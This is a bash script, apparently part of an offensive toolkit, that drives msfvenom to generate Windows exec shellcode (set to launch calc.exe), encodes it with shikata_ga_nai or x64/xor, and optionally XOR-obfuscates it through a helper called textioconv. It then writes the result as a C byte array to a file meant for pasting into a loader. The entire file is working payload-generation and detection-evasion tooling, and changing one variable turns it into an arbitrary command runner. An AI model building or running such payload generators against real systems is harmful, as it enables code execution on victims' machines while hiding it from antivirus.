#!/bin/bash

arch=""
varSRC=""
XOR_Key=""

usage() {

    echo -en "\nUsage: $(basename "$0") -a <target arch> [opt][-v <varname> -k <xor key>]\n"
    exit 1

}

while getopts ":a:v:k:" opt; do
    case ${opt} in
        a)
            arch="$OPTARG"

            if [[ "${arch}" == "x64" ]];then 

                payload="windows/x64/exec"

            elif [[ "${arch}" == "x86" ]];then

                payload="windows/exec"

            else

                echo -en "\nThe arch ${arch} not recognized. The usables arch are : x86 and x64"
                exit

            fi
            ;;
        v)
            varSRC="$OPTARG"
            ;;
        k)
            XOR_Key="$OPTARG"
            ;;

        \?)
            echo -en "\nInvalid switch: -$OPTARG\n" 1>&2
            usage
            ;;
        :)
            echo -en "\nThe switch -$OPTARG needs an argument.\n" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

if [[ -z ${arch} ]];then

    usage

elif [[ ! -x "$(command -v textioconv)" ]];then 

    echo -en "\nThis script is meant to be used with textioconv..."
    exit

else 

    src_code=toPaste.txt
    msfShell=/tmp/msf.txt
    run="calc.exe"
    [[ -z ${varSRC} ]] && varSRC=encrypted_txt 
    [[ -f ${src_code} ]] && rm ${src_code} 
    [[ -f ${msfShell} ]] && rm ${msfShell}
    
    if [[ "${arch}" == "x86" ]];then

        eX86="x86/shikata_ga_nai"
        msfvenom -p "${payload}" CMD=${run} -e "${eX86}" --smallest --platform windows -a "${arch}" -b "\x00" -i 0 -f c -o ${msfShell}

    else

        eX64="x64/xor"
        msfvenom -p "${payload}" CMD=${run} -e "${eX64}" --smallest --platform windows -a "${arch}" -b "\x00" -i 0 -f c -o ${msfShell}

    fi

    hexShell=$(sed -z 's|unsigned char buf\[\]||;s|[\\x\x0A\x1B\x20\x22\x3B\x3D]||g' ${msfShell})
    
    if [[ -n "${XOR_Key}" ]];then

        ocShellCode=$(textioconv -s "${hexShell}" -x "${XOR_Key}")

    else

        ocShellCode=$(textioconv -s "${hexShell}")

    fi

    if [[ -n ${ocShellCode} ]];then 

        sh_size=$(echo ${ocShellCode} | tr ',' ' ' | wc -w)
        ((sh_size+=1))
        echo "unsigned char ${varSRC}[${sh_size}] = {${ocShellCode}, 0000};" | dd of=${src_code} >/dev/null 2>&1
        echo -en "\nThe shellcode has been written in the txt file ${src_code}."
        [[ -n ${XOR_Key} ]] && echo -en "\nThe xor key is : ${XOR_Key}" || echo -en "\nThe xor key is : MySecretKey"

    else

        echo "the array has been not generated."

    fi

fi